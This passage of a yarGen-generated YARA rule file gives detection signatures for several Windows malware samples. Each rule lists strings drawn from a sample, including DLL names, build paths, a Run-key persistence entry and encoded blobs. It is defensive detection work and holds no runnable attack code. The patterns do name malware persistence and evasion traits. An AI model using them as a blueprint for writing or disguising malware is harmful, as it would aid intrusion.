      $s6 = "Y@kernel32.dll" fullword ascii /* score: '20.00'*/
      $s7 = "e@ntdll.dll" fullword ascii /* score: '20.00'*/
      $s8 = "offffff" fullword ascii /* reversed goodware string 'ffffffo' */ /* score: '18.00'*/
      $s9 = "software\\microsoft\\windows\\CurrentVersion\\Run\\libshell" fullword ascii /* score: '12.00'*/
      $s10 = "GetConnectString" fullword ascii /* score: '9.00'*/
      $s11 = "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)" fullword ascii /* score: '9.00'*/
      $s12 = "GetTabList" fullword ascii /* score: '9.00'*/
      $s13 = " but running with " fullword ascii /* score: '9.00'*/
      $s14 = "foffffff" fullword ascii /* score: '8.00'*/
      $s15 = " (*.txt)|*.txt|" fullword ascii /* score: '8.00'*/
      $s16 = "fffffffffffhwww" fullword ascii /* score: '8.00'*/
      $s17 = "bcdfghijklmnpqrstuvwxyz" fullword ascii /* score: '8.00'*/
      $s18 = "hgjlkbrfzaoe" fullword ascii /* score: '8.00'*/
      $s19 = "nzzpenc" fullword ascii /* score: '8.00'*/
      $s20 = "out.prn" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357d795a7 {
   meta:
      description = "mw - file 3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357d795a7"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3bac3abbdcd2735ccff4692acd0ba8019e4a22426fcfeaa75c02419357d795a7"
   strings:
      $x1 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x2 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x3 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x4 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x5 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s6 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s7 = "hello.exe" fullword ascii /* score: '27.00'*/
      $s8 = "Setup=hello.exe" fullword ascii /* score: '24.00'*/
      $s9 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s10 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s11 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s12 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s13 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s14 = "WINNSI.DLL" fullword wide /* score: '23.00'*/
      $s15 = "sfxrar.exe" fullword ascii /* score: '22.00'*/
      $s16 = "baoxiniao.exe" fullword ascii /* score: '22.00'*/
      $s17 = "Setup=baoxiniao.exe" fullword ascii /* score: '19.00'*/
      $s18 = "D:\\Projects\\WinRAR\\sfx\\build\\sfxrar32\\Release\\sfxrar.pdb" fullword ascii /* score: '19.00'*/
      $s19 = "$GETPASSWORD1:IDOK" fullword ascii /* score: '17.00'*/
      $s20 = "$GETPASSWORD1:SIZE" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule sig_3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c {
   meta:
      description = "mw - file 3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s3 = "Mozilla/5.0 (Linux; Android 8.0; MI 6 Build/OPR1.170623.027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0." wide /* score: '12.00'*/
      $s4 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s5 = " Type Descriptor'" fullword ascii /* score: '10.00'*/
      $s6 = "operator co_await" fullword ascii /* score: '9.00'*/
      $s7 = "operator<=>" fullword ascii /* score: '9.00'*/
      $s8 = ".data$rs" fullword ascii /* score: '8.00'*/
      $s9 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '7.00'*/
      $s10 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide /* score: '7.00'*/
      $s11 = "ROOT\\Microsoft\\Windows\\Defender" fullword wide /* score: '7.00'*/
      $s12 = "images/person.png" fullword wide /* score: '7.00'*/
      $s13 = "images/box.png" fullword wide /* score: '7.00'*/
      $s14 = "images/box_dest.png" fullword wide /* score: '7.00'*/
      $s15 = "images/dest.png" fullword wide /* score: '7.00'*/
      $s16 = "images/wall.png" fullword wide /* score: '7.00'*/
      $s17 = "images/blank.png" fullword wide /* score: '7.00'*/
      $s18 = " Class Hierarchy Descriptor'" fullword ascii /* score: '6.00'*/
      $s19 = " Base Class Descriptor at (" fullword ascii /* score: '6.00'*/
      $s20 = " Complete Object Locator'" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5 {
   meta:
      description = "mw - file 6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5"
   strings:
      $x1 = "bapi-ms-win-core-processenvironment-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x2 = "bapi-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x3 = "bapi-ms-win-core-processthreads-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x4 = "bapi-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s5 = "bapi-ms-win-core-namedpipe-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s6 = "bapi-ms-win-core-libraryloader-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s7 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s8 = "2333333333" ascii /* reversed goodware string '3333333332' */ /* score: '27.00'*/ /* hex encoded string '#3333' */
      $s9 = "Failed to get address for Tcl_FindExecutable" fullword ascii /* score: '27.00'*/
      $s10 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" language=\"*\" processorArchitecture=\"*\" ver" ascii /* score: '27.00'*/
      $s11 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s12 = "bapi-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s13 = "bpython38.dll" fullword ascii /* score: '23.00'*/
      $s14 = "bapi-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s15 = "Failed to execute script '%s' due to unhandled exception!" fullword ascii /* score: '23.00'*/
      $s16 = "4python38.dll" fullword ascii /* score: '23.00'*/
      $s17 = "bucrtbase.dll" fullword ascii /* score: '23.00'*/
      $s18 = "bapi-ms-win-crt-runtime-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s19 = "bapi-ms-win-core-errorhandling-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s20 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 18000KB and
      1 of ($x*) and 4 of them
}

rule b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985 {
   meta:
      description = "mw - file b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
   strings:
      $x1 = "C:\\Users\\Public\\Downloads\\ConsoleApplication1.exe" fullword wide /* score: '40.00'*/
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s3 = "6e002d005a00" ascii /* base64 encoded string '{M6wM9kM' */ /* score: '27.00'*/ /* hex encoded string 'n-Z' */
      $s4 = "6d006a002d00" ascii /* base64 encoded string 'wM:kM6wM' */ /* score: '27.00'*/ /* hex encoded string 'mj-' */
      $s5 = "6b002d006d00" ascii /* base64 encoded string 'oM6wM:wM' */ /* score: '27.00'*/ /* hex encoded string 'k-m' */
      $s6 = "6e002d004e00" ascii /* base64 encoded string '{M6wM8{M' */ /* score: '27.00'*/ /* hex encoded string 'n-N' */
      $s7 = "6e002d004d00" ascii /* base64 encoded string '{M6wM8wM' */ /* score: '27.00'*/ /* hex encoded string 'n-M' */
      $s8 = "6c002d004e00" ascii /* base64 encoded string 'sM6wM8{M' */ /* score: '27.00'*/ /* hex encoded string 'l-N' */
      $s9 = "6e002d006a00" ascii /* base64 encoded string '{M6wM:kM' */ /* score: '27.00'*/ /* hex encoded string 'n-j' */
      $s10 = "6c006c004d00" ascii /* base64 encoded string 'sM:sM8wM' */ /* score: '27.00'*/ /* hex encoded string 'llM' */
      $s11 = "6c002d006e00" ascii /* base64 encoded string 'sM6wM:{M' */ /* score: '27.00'*/ /* hex encoded string 'l-n' */
      $s12 = "6e002d006d00" ascii /* base64 encoded string '{M6wM:wM' */ /* score: '27.00'*/ /* hex encoded string 'n-m' */
      $s13 = "6d006e002d00" ascii /* base64 encoded string 'wM:{M6wM' */ /* score: '27.00'*/ /* hex encoded string 'mn-' */
      $s14 = "6e002d007a00" ascii /* base64 encoded string '{M6wM;kM' */ /* score: '27.00'*/ /* hex encoded string 'n-z' */
      $s15 = "6e002d006e00" ascii /* base64 encoded string '{M6wM:{M' */ /* score: '27.00'*/ /* hex encoded string 'n-n' */
      $s16 = "6b002d006b00" ascii /* base64 encoded string 'oM6wM:oM' */ /* score: '27.00'*/ /* hex encoded string 'k-k' */
      $s17 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s18 = "6f006e006400" ascii /* score: '17.00'*/ /* hex encoded string 'ond' */
      $s19 = "656174655379" ascii /* score: '17.00'*/ /* hex encoded string 'eateSy' */
      $s20 = "72002d006300" ascii /* score: '17.00'*/ /* hex encoded string 'r-c' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule ec621d8d37fd8e0032228b3d756f2dc557f22b9b7e9fa02d3c53106d63644748 {
   meta:
      description = "mw - file ec621d8d37fd8e0032228b3d756f2dc557f22b9b7e9fa02d3c53106d63644748"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "ec621d8d37fd8e0032228b3d756f2dc557f22b9b7e9fa02d3c53106d63644748"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo><security><requestedPrivileges><requeste" ascii /* score: '32.00'*/
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s4 = "cutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><appli" ascii /* score: '19.00'*/
      $s5 = "on xmlns=\"urn:schemas-microsoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSe" ascii /* score: '17.00'*/
      $s6 = " Type Descriptor'" fullword ascii /* score: '10.00'*/
      $s7 = "operator co_await" fullword ascii /* score: '9.00'*/
      $s8 = "operator<=>" fullword ascii /* score: '9.00'*/
      $s9 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo><security><requestedPrivileges><requeste" ascii /* score: '9.00'*/
      $s10 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide /* score: '7.00'*/
      $s11 = "PSSSUVS" fullword ascii /* score: '6.50'*/
      $s12 = " Class Hierarchy Descriptor'" fullword ascii /* score: '6.00'*/
      $s13 = " Base Class Descriptor at (" fullword ascii /* score: '6.00'*/
      $s14 = " Complete Object Locator'" fullword ascii /* score: '5.00'*/
      $s15 = "%h%tbn" fullword ascii /* score: '5.00'*/
      $s16 = "SECURITY" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.71'*/ /* Goodware String - occured 291 times */
      $s17 = "Hardware" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.68'*/ /* Goodware String - occured 321 times */
      $s18 = "HKEY_PERFORMANCE_DATA" fullword ascii /* PEStudio Blacklist: reg */ /* score: '4.67'*/ /* Goodware String - occured 335 times */
      $s19 = "FileType" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.65'*/ /* Goodware String - occured 346 times */
      $s20 = "HKEY_DYN_DATA" fullword ascii /* PEStudio Blacklist: reg */ /* score: '4.65'*/ /* Goodware String - occured 350 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3 {
   meta:
      description = "mw - file 6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3"
   strings:
      $x1 = "C:\\Users\\AVitest\\Desktop\\AAVs\\loader\\target\\release\\deps\\aaaaa.pdb" fullword ascii /* score: '47.00'*/
      $s2 = "C:\\Users\\AVitest\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\serde_json-1.0.102\\src\\error.rsEOF while parsing " ascii /* score: '29.00'*/
      $s3 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s4 = "C:\\Users\\AVitest\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\serde_json-1.0.102\\src\\error.rsEOF while parsing " ascii /* score: '23.00'*/
      $s5 = "C:\\Users\\AVitest\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\serde_json-1.0.102\\src\\read.rs" fullword ascii /* score: '23.00'*/
      $s6 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\rustc-demangle-0.1.23\\src\\v0.rs" fullword ascii /* score: '23.00'*/
      $s7 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\rustc-demangle-0.1.23\\src\\legacy.rs" fullword ascii /* score: '23.00'*/
      $s8 = "C:\\Users\\AVitest\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\base64-0.21.2\\src\\engine\\general_purpose\\decode" ascii /* score: '22.00'*/
      $s9 = "C:\\Users\\AVitest\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\base64-0.21.2\\src\\engine\\general_purpose\\decode" ascii /* score: '22.00'*/
      $s10 = "fatal runtime error: drop of the panic payload panicked" fullword ascii /* score: '21.00'*/
      $s11 = "C:\\Users\\AVitest\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\hex-0.4.3\\src\\lib.rs" fullword ascii /* score: '20.00'*/
      $s12 = "ullruealseinternal error: entered unreachable codeC:\\Users\\AVitest\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\s" ascii /* score: '20.00'*/
      $s13 = "C:\\Users\\AVitest\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\libaes-0.6.5\\src\\lib.rs" fullword ascii /* score: '20.00'*/
      $s14 = "ectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a dir" ascii /* score: '20.00'*/
      $s15 = ".llvm.C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\rustc-demangle-0.1.23\\src\\lib.rs" fullword ascii /* score: '20.00'*/
      $s16 = "ullruealseinternal error: entered unreachable codeC:\\Users\\AVitest\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\s" ascii /* score: '20.00'*/
      $s17 = "fatal runtime error: I/O error: operation failed to complete synchronously" fullword ascii /* score: '18.00'*/
      $s18 = "Unable to create keyed event handle: error " fullword ascii /* score: '15.00'*/
      $s19 = "lock count overflow in reentrant mutexlibrary\\std\\src\\sync\\remutex.rs" fullword ascii /* score: '15.00'*/
      $s20 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_337ba1bd5050c38f5e07f494d4dc0125276b0e0dea09667d86e7d763249c8f30 {
   meta:
      description = "mw - file 337ba1bd5050c38f5e07f494d4dc0125276b0e0dea09667d86e7d763249c8f30"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "337ba1bd5050c38f5e07f494d4dc0125276b0e0dea09667d86e7d763249c8f30"
   strings:
      $s1 = "ODcyYjAwZWItYzNjMS03YWMzLTUzMGEtNTlmODg3NGU4MmEw" fullword ascii /* base64 encoded string '872b00eb-c3c1-7ac3-530a-59f8874e82a0' */ /* score: '26.00'*/
      $s2 = "OGIwMDllOTgtOWY0YS1jYmU3LThiNGEtYjdlN2QzOTQ4YjQw" fullword ascii /* base64 encoded string '8b009e98-9f4a-cbe7-8b4a-b7e7d3948b40' */ /* score: '24.00'*/
      $s3 = "ZDBlOGQzYmUtNDg4Ny1mMDAxLTExOGEtMDIyM2MxMmJiMmNl" fullword ascii /* base64 encoded string 'd0e8d3be-4887-f001-118a-0223c12bb2ce' */ /* score: '24.00'*/
      $s4 = "ODIyYTQ4OGEtMzM0OC01MzJiLTMwM2MtM2M4YjRlOGZlN2Uz" fullword ascii /* base64 encoded string '822a488a-3348-532b-303c-3c8b4e8fe7e3' */ /* score: '24.00'*/
      $s5 = "ZTc5NzRlOGEtOGZjNy0zYWMwLTI4ZDctOGY0ZWZmODM4NmYw" fullword ascii /* base64 encoded string 'e7974e8a-8fc7-3ac0-28d7-8f4eff8386f0' */ /* score: '24.00'*/
      $s6 = "NDZjNzg0NGEtYmQwMy04YmQ0LTRlOGMtY2I4YmU4MzQ0OTg3" fullword ascii /* base64 encoded string '46c7844a-bd03-8bd4-4e8c-cb8be8344987' */ /* score: '24.00'*/
      $s7 = "OGIwMDllOWQtOWY0YS1jYmU3LThiNGEtYjdlN2QzOTQ4YjQw" fullword ascii /* base64 encoded string '8b009e9d-9f4a-cbe7-8b4a-b7e7d3948b40' */ /* score: '24.00'*/
      $s8 = "ZTc5ZjRlOGYtOGE4My05ODQ4LWYzOGEtNDhhOGZiOGE0OGIw" fullword ascii /* base64 encoded string 'e79f4e8f-8a83-9848-f38a-48a8fb8a48b0' */ /* score: '24.00'*/
      $s9 = "NWI5NjRlOGItNGU4Yi1kMzhlLThiNGEtODdlN2UzMmI3MjNm" fullword ascii /* base64 encoded string '5b964e8b-4e8b-d38e-8b4a-87e7e32b723f' */ /* score: '24.00'*/
      $s10 = "OWJjNjRlOGYtM2NhNi00ODNjLTEzOGEtNDgwOThiNDAwN2Vi" fullword ascii /* base64 encoded string '9bc64e8f-3ca6-483c-138a-48098b4007eb' */ /* score: '24.00'*/
      $s11 = "ZmI4NjRlOGYtNDg4Mi04YTExLTQ4MGEtMmJjM2MyYzNjMzI4" fullword ascii /* base64 encoded string 'fb864e8f-4882-8a11-480a-2bc3c2c3c328' */ /* score: '24.00'*/
      $s12 = "ZTc5ZjRlOGYtOGE5My05ODQ4LWYzOGEtNDhiMDgzOGE0OGI4" fullword ascii /* base64 encoded string 'e79f4e8f-8a93-9848-f38a-48b0838a48b8' */ /* score: '24.00'*/
      $s13 = "MzRhNmZlOGEtNTM5ZC1hMjJlLWEwNTUtZjMwNTMyZTE4YWE0" fullword ascii /* base64 encoded string '34a6fe8a-539d-a22e-a055-f30532e18aa4' */ /* score: '24.00'*/
      $s14 = "Yjg0ODhhZDMtOGVkYi1iMDQ4LWUzOGEtNDgyMDllMDAwZjhi" fullword ascii /* base64 encoded string 'b8488ad3-8edb-b048-e38a-48209e000f8b' */ /* score: '24.00'*/
      $s15 = "MGI4NjRlOGItNGU4Yi0yMzk2LThiNGEtODdlN2ViOGI0ZTg2" fullword ascii /* base64 encoded string '0b864e8b-4e8b-2396-8b4a-87e7eb8b4e86' */ /* score: '24.00'*/
      $s16 = "MjM4YjRlOGItZjA4Ni0yYjAzLWY0ZGEtYzNjMzQ2MDNiNmJk" fullword ascii /* base64 encoded string '238b4e8b-f086-2b03-f4da-c3c34603b6bd' */ /* score: '24.00'*/
      $s17 = "OGI5NGRiZTctMmY0MC1mMDgzLTJlOGEtNDgxYjhiNDgzOThi" fullword ascii /* base64 encoded string '8b94dbe7-2f40-f083-2e8a-481b8b48398b' */ /* score: '24.00'*/
      $s18 = "YzNjM2VjYzQtNDg4Yi04YjMzLTRlOGYtZTdiMzJiZDllZGMz" fullword ascii /* base64 encoded string 'c3c3ecc4-488b-8b33-4e8f-e7b32bd9edc3' */ /* score: '24.00'*/
      $s19 = "NmJjNjRlOGYtM2NhOS00ODNjLTEzOGEtNDgwOThiNDAwN2Vi" fullword ascii /* base64 encoded string '6bc64e8f-3ca9-483c-138a-48098b4007eb' */ /* score: '24.00'*/
      $s20 = "YjA0ODhhZDMtOGFkYi1iODQ4LWUzOGEtNDgyMDllMDAwZjgz" fullword ascii /* base64 encoded string 'b0488ad3-8adb-b848-e38a-48209e000f83' */ /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      8 of them
}

rule d3bd4efe6795d73420f670212e364814b03e8e844b351518a76703c0ff22c68d {
   meta:
      description = "mw - file d3bd4efe6795d73420f670212e364814b03e8e844b351518a76703c0ff22c68d"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "d3bd4efe6795d73420f670212e364814b03e8e844b351518a76703c0ff22c68d"
   strings:
      $x1 = "mpsvc.dll" fullword ascii /* reversed goodware string 'lld.cvspm' */ /* score: '33.00'*/
      $s2 = "|xtplhd" fullword ascii /* reversed goodware string 'dhlptx|' */ /* score: '11.00'*/
      $s3 = "~n^N>." fullword ascii /* reversed goodware string '.>N^n~' */ /* score: '11.00'*/
      $s4 = "veTC2!" fullword ascii /* reversed goodware string '!2CTev' */ /* score: '11.00'*/
      $s5 = "wvutsri" fullword ascii /* score: '8.00'*/
      $s6 = "kjihgfed" fullword ascii /* score: '8.00'*/
      $s7 = "gdi32.dlH" fullword ascii /* score: '7.00'*/
      $s8 = "The average marks obtained in subject %d is: %.2f" fullword ascii /* score: '7.00'*/
      $s9 = "ServiceCrtMain" fullword ascii /* score: '7.00'*/
      $s10 = "UAWAVAUATVWSH" fullword ascii /* score: '6.50'*/
      $s11 = "AWAVATVWSH" fullword ascii /* score: '6.50'*/
      $s12 = "AVVWUSH" fullword ascii /* score: '6.50'*/
      $s13 = "AWAVAUATVWUSH" fullword ascii /* score: '6.50'*/
      $s14 = "AWAVVWSH" fullword ascii /* score: '6.50'*/
      $s15 = "AWAVAUATVWSH" fullword ascii /* score: '6.50'*/
      $s16 = "AWAVVWUSH" fullword ascii /* score: '6.50'*/
      $s17 = "TQROHEFC" fullword ascii /* score: '6.50'*/
      $s18 = "vector too long" fullword ascii /* score: '6.00'*/
      $s19 = "[MB- cGU;" fullword ascii /* score: '5.00'*/
      $s20 = "\\RHND:06" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule sig_34c1447f2bc18265a71260fd20c773301aab0ff700518ab2da8fe0ce9e55a2eb {
   meta:
      description = "mw - file 34c1447f2bc18265a71260fd20c773301aab0ff700518ab2da8fe0ce9e55a2eb"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "34c1447f2bc18265a71260fd20c773301aab0ff700518ab2da8fe0ce9e55a2eb"
   strings:
      $x1 = "AAAAAAAA6" ascii /* base64 encoded string '      ' */ /* reversed goodware string '6AAAAAAAA' */ /* score: '35.00'*/
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s3 = "66666666666666666666666C" ascii /* reversed goodware string 'C66666666666666666666666' */ /* score: '27.00'*/ /* hex encoded string 'fffffffffffl' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */ /* score: '26.50'*/
      $s5 = "ymsvcrt.dll" fullword wide /* score: '23.00'*/
      $s6 = "ksolaunch.exe" fullword wide /* score: '22.00'*/
      $s7 = "6666666666666666666666666666666666666666666666" ascii /* score: '17.00'*/ /* hex encoded string 'fffffffffffffffffffffff' */
      $s8 = "66666666666666666666666666666b" ascii /* score: '17.00'*/ /* hex encoded string 'ffffffffffffffk' */
      $s9 = "66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666" ascii /* score: '17.00'*/ /* hex encoded string 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffi' */
      $s10 = "666666666666666666666666667c" ascii /* score: '17.00'*/ /* hex encoded string 'fffffffffffff|' */
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                 ' */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                          ' */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */ /* score: '16.50'*/
      $s14 = "AAAAAAAAAAA4" ascii /* base64 encoded string '        8' */ /* score: '15.00'*/
      $s15 = "AAAAAAAAAAAAAAAAAAA8" ascii /* base64 encoded string '              <' */ /* score: '15.00'*/
      $s16 = "AAAAAAAAAAAAAAA8" ascii /* base64 encoded string '           <' */ /* score: '15.00'*/
      $s17 = "AAAAAAAAA8" ascii /* reversed goodware string '8AAAAAAAAA' */ /* score: '15.00'*/
      $s18 = "customXml/itemProps2.xml]NM" fullword ascii /* score: '14.00'*/
      $s19 = "<AAAAAAAAAAAAAAAA" fullword ascii /* base64 encoded string '            ' */ /* score: '14.00'*/
      $s20 = "4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4" ascii /* base64 encoded string '                       8' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule c0b4b7b1183401644c556b5cc8e92c0f13970a370fca43635785f65f81e9a1d5 {
   meta:
      description = "mw - file c0b4b7b1183401644c556b5cc8e92c0f13970a370fca43635785f65f81e9a1d5"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "c0b4b7b1183401644c556b5cc8e92c0f13970a370fca43635785f65f81e9a1d5"
   strings:
      $s1 = "7b3d3c3c3c28" ascii /* base64 encoded string 'owwsw7so' */ /* score: '27.00'*/ /* hex encoded string '{=<<<(' */
      $s2 = "6e6e6e6e6e6e" ascii /* reversed goodware string 'e6e6e6e6e6e6' */ /* score: '27.00'*/ /* hex encoded string 'nnnnnn' */
      $s3 = "2b252b3c3c2b" ascii /* base64 encoded string 'onvow7sf' */ /* score: '27.00'*/ /* hex encoded string '+%+<<+' */
      $s4 = "7469616c697a" ascii /* score: '17.00'*/ /* hex encoded string 'tializ' */
      $s5 = "717273747576" ascii /* score: '17.00'*/ /* hex encoded string 'qrstuv' */
      $s6 = "436f6e74656e" ascii /* score: '17.00'*/ /* hex encoded string 'Conten' */
      $s7 = "626364656667" ascii /* score: '17.00'*/ /* hex encoded string 'bcdefg' */
      $s8 = "414243444546" ascii /* score: '17.00'*/ /* hex encoded string 'ABCDEF' */
      $s9 = "57696e646f77" ascii /* score: '17.00'*/ /* hex encoded string 'Window' */
      $s10 = "6a6b6c6d6e6f" ascii /* score: '17.00'*/ /* hex encoded string 'jklmno' */
      $s11 = "616263646566" ascii /* score: '17.00'*/ /* hex encoded string 'abcdef' */
      $s12 = "515253545556" ascii /* score: '17.00'*/ /* hex encoded string 'QRSTUV' */
      $s13 = "6164706f6f6c" ascii /* score: '17.00'*/ /* hex encoded string 'adpool' */
      $s14 = "2a2b2c2d2e2f" ascii /* score: '17.00'*/ /* hex encoded string '*+,-./' */
      $s15 = "7a656420636f" ascii /* score: '17.00'*/ /* hex encoded string 'zed co' */
